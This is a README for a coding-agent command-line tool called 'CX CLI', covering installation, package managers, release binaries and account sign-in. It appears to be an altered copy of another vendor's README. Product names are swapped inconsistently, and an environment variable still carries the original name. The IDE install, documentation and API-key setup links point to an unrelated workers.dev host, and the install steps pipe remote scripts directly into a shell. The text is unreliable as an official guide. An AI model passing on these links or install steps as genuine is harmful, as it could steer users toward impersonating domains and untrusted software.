<p align="center"><strong>CX CLI</strong> is a coding agent from oi that runs locally on your computer.
<p align="center">
  <img src="https://github.com/openai/cx/blob/main/.github/cx-cli-splash.png" alt="CX CLI splash" width="80%" />
</p>
</br>
If you want CX in your code editor (VS Code, Cursor, Windsurf), <a href="https://developers.cy.symbiotyc.workers.dev/cx/ide">install in your IDE.</a>
</br>If you want the desktop app experience, run <code>cx app</code> or visit <a href="https://chatgpt.com/cx?app-landing-page=true">the CX App page</a>.
</br>If you are looking for the <em>cloud-based agent</em> from oi, <strong>CX Web</strong>, go to <a href="https://chatgpt.com/cx">chatgpt.com/cx</a>.</p>

---

## Quickstart

### Installing and running CX CLI

Run the following on Mac or Linux to install CX CLI:

```shell
curl -fsSL https://chatgpt.com/cx/install.sh | sh
```

Run the following on Windows to install CX CLI:

```shell
powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/cx/install.ps1 | iex"
```

The standalone installers download from `https://releases.openai.com/cx` by default and fall back to GitHub Releases if a metadata or asset download is unavailable. To force GitHub Releases, set `CODEX_INSTALLER_USE_RELEASES_OPENAI_COM` to `false` (`0` and `no` are also accepted):

```shell
curl -fsSL https://chatgpt.com/cx/install.sh | CODEX_INSTALLER_USE_RELEASES_OPENAI_COM=false sh
```

```powershell
$env:CODEX_INSTALLER_USE_RELEASES_OPENAI_COM='false'; irm https://chatgpt.com/cx/install.ps1 | iex
```

CX CLI can also be installed via the following package managers:

```shell
# Install using npm
npm install -g @openai/cx
```

```shell
# Install using Homebrew
brew install --cask cx
```

Then simply run `cx` to get started.

<details>
<summary>You can also go to the <a href="https://github.com/openai/cx/releases/latest">latest GitHub Release</a> and download the appropriate binary for your platform.</summary>

Each GitHub Release contains many executables, but in practice, you likely want one of these:

- macOS
  - Apple Silicon/arm64: `cx-aarch64-apple-darwin.tar.gz`
  - x86_64 (older Mac hardware): `cx-x86_64-apple-darwin.tar.gz`
- Linux
  - x86_64: `cx-x86_64-unknown-linux-musl.tar.gz`
  - arm64: `cx-aarch64-unknown-linux-musl.tar.gz`

Each archive contains a single entry with the platform baked into the name (e.g., `cx-x86_64-unknown-linux-musl`), so you likely want to rename it to `cx` after extracting it.

</details>

### Using CX with your gt plan

Run `cx` and select **Sign in with gt**. We recommend signing into your gt account to use CX as part of your Plus, Pro, Business, Edu, or Enterprise plan. [Learn more about what's included in your gt plan](https://help.openai.com/en/articles/11369540-cx-in-chatgpt).

You can also use CX with an API key, but this requires [additional setup](https://developers.cy.symbiotyc.workers.dev/cx/auth#sign-in-with-an-api-key).

## Docs

- [**CX Documentation**](https://developers.cy.symbiotyc.workers.dev/cx)
- [**Contributing**](./docs/contributing.md)
- [**Installing & building**](./docs/install.md)
- [**Open source fund**](./docs/open-source-fund.md)

This repository is licensed under the [Apache-2.0 License](LICENSE).
